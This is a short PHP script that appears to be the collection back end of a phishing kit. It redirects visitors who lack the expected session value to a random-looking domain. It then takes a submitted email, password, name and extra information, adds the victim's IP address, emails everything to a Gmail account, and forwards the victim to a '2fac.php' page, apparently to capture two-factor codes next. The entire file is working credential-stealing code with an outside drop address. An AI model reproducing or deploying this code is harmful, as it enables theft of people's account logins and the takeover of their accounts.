<?php

session_start();
if(isset($_SESSION['u'])){
  if($_SESSION['u'] === '123') {
  }else {
    header("Location: https://aswjhqegwemszcds.cz");
  }
}else {
 header("Location: https://aswjhqegwemszcds.cz");
}

$emsf = $_POST['emsf'];

$pwja = $_POST['pwja'];

$fname = $_POST['fname'];

$adninfo = $_POST['adninfo'];

$pgus = $_POST['pgus'];

$ip = $_SERVER['REMOTE_ADDR'];



$stringi = 'Email: '.$emsf . PHP_EOL .'PW: '. $pwja.PHP_EOL .'IP:'. $ip.PHP_EOL .'Name: '.$fname . PHP_EOL .'AddInfo: '. $adninfo . PHP_EOL. 'PageId: '. $pgus;
mail("xhoka2@gmail.com","Ra", $stringi);
header("Location: 2fac.php");

?>